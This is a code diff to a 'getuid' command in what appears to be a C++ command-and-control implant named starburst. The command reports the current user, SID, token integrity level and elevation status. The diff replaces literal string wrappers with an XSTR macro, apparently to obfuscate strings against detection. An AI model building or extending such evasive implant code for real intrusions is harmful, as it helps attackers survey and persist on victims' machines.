@@ -29,7 +29,7 @@ auto declfn starburst::cmd_getuid(
 
     if ( !inst.advapi32.OpenProcessToken( h_proc, TOKEN_QUERY, &h_token ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "OpenProcessToken failed" ) ) );
+            XSTR( "OpenProcessToken failed" ) );
         return;
     }
 
@@ -38,7 +38,7 @@ auto declfn starburst::cmd_getuid(
     if ( !output ) {
         inst.kernel32.CloseHandle( h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t off = 0;
@@ -83,7 +83,7 @@ auto declfn starburst::cmd_getuid(
             if ( pConvertSidToStringSidA && pLocalFree ) {
                 LPSTR sid_str = nullptr;
                 if ( pConvertSidToStringSidA( tu->User.Sid, &sid_str ) && sid_str ) {
-                    str_copy( output + off, symbol<char*>( const_cast<char*>( " (SID: " ) ) );
+                    str_copy( output + off, XSTR( " (SID: " ) );
                     off += 7;
                     uint32_t slen = str_len( sid_str );
                     if ( slen > 200 ) slen = 200;
@@ -118,29 +118,29 @@ auto declfn starburst::cmd_getuid(
                 sub_auth = pGetSidSubAuthority( til->Label.Sid, (DWORD)( *p_count - 1 ) );
             }
 
-            str_copy( output + off, symbol<char*>( const_cast<char*>( " [Integrity: " ) ) );
+            str_copy( output + off, XSTR( " [Integrity: " ) );
             off += 13;
 
             if ( sub_auth ) {
                 DWORD level = *sub_auth;
                 if ( level >= 0x4000 ) {
-                    str_copy( output + off, symbol<char*>( const_cast<char*>( "System" ) ) );
+                    str_copy( output + off, XSTR( "System" ) );
                     off += 6;
                 } else if ( level >= 0x3000 ) {
-                    str_copy( output + off, symbol<char*>( const_cast<char*>( "High" ) ) );
+                    str_copy( output + off, XSTR( "High" ) );
                     off += 4;
                 } else if ( level >= 0x2000 ) {
-                    str_copy( output + off, symbol<char*>( const_cast<char*>( "Medium" ) ) );
+                    str_copy( output + off, XSTR( "Medium" ) );
                     off += 6;
                 } else if ( level >= 0x1000 ) {
-                    str_copy( output + off, symbol<char*>( const_cast<char*>( "Low" ) ) );
+                    str_copy( output + off, XSTR( "Low" ) );
                     off += 3;
                 } else {
-                    str_copy( output + off, symbol<char*>( const_cast<char*>( "Untrusted" ) ) );
+                    str_copy( output + off, XSTR( "Untrusted" ) );
                     off += 9;
                 }
             } else {
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Unknown" ) ) );
+                str_copy( output + off, XSTR( "Unknown" ) );
                 off += 7;
             }
 
@@ -154,14 +154,14 @@ auto declfn starburst::cmd_getuid(
     TOKEN_ELEVATION te = {};
     needed = sizeof( TOKEN_ELEVATION );
     if ( inst.advapi32.GetTokenInformation( h_token, TokenElevation, &te, sizeof( te ), &needed ) ) {
-        str_copy( output + off, symbol<char*>( const_cast<char*>( " [Elevated: " ) ) );
+        str_copy( output + off, XSTR( " [Elevated: " ) );
         off += 12;
 
         if ( te.TokenIsElevated ) {
-            str_copy( output + off, symbol<char*>( const_cast<char*>( "Yes" ) ) );
+            str_copy( output + off, XSTR( "Yes" ) );
             off += 3;
         } else {
-            str_copy( output + off, symbol<char*>( const_cast<char*>( "No" ) ) );
+            str_copy( output + off, XSTR( "No" ) );
             off += 2;
         }
 
